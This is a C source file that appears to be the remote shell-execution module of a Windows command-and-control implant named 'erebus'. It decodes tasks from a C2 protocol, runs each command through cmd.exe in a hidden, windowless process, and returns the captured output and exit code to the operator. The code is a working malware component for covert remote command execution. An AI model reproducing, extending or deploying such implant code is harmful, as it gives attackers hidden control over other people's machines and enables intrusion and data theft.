#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/pb_c2.h"

#define MAX_OUTPUT (10 << 20)

static int run_cmd(const char *command, char **stdout_out, char **stderr_out, int32_t *exit_code) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE rd_out = NULL, wr_out = NULL, rd_err = NULL, wr_err = NULL;
    CreatePipe(&rd_out, &wr_out, &sa, 0);
    CreatePipe(&rd_err, &wr_err, &sa, 0);
    SetHandleInformation(rd_out, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(rd_err, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = wr_out;
    si.hStdError = wr_err;
    si.wShowWindow = SW_HIDE;

    char cmdline[8192];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /C %s", command);

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(rd_out); CloseHandle(wr_out); CloseHandle(rd_err); CloseHandle(wr_err);
        return 0;
    }
    CloseHandle(wr_out);
    CloseHandle(wr_err);

    char *out_buf = (char *)calloc(1, 65536);
    char *err_buf = (char *)calloc(1, 65536);
    size_t out_len = 0, err_len = 0;
    char tmp[4096];
    DWORD n = 0;
    while (ReadFile(rd_out, tmp, sizeof(tmp), &n, NULL) && n > 0) {
        if (out_len + n < 65535) { memcpy(out_buf + out_len, tmp, n); out_len += n; }
    }
    while (ReadFile(rd_err, tmp, sizeof(tmp), &n, NULL) && n > 0) {
        if (err_len + n < 65535) { memcpy(err_buf + err_len, tmp, n); err_len += n; }
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);

    CloseHandle(rd_out);
    CloseHandle(rd_err);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    *stdout_out = out_buf;
    *stderr_out = err_buf;
    *exit_code = (int32_t)code;
    return 1;
}

int erebus_task_shell_execute(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    erebus_shell_task st;
    if (!erebus_pb_decode_shell_task(data, data_len, &st)) return 0;
    char *so = NULL, *se = NULL;
    int32_t code = 1;
    if (!run_cmd(st.command, &so, &se, &code)) return 0;
    int ok = erebus_pb_encode_shell_result(so, se, code, out, out_len);
    free(so);
    free(se);
    return ok;
}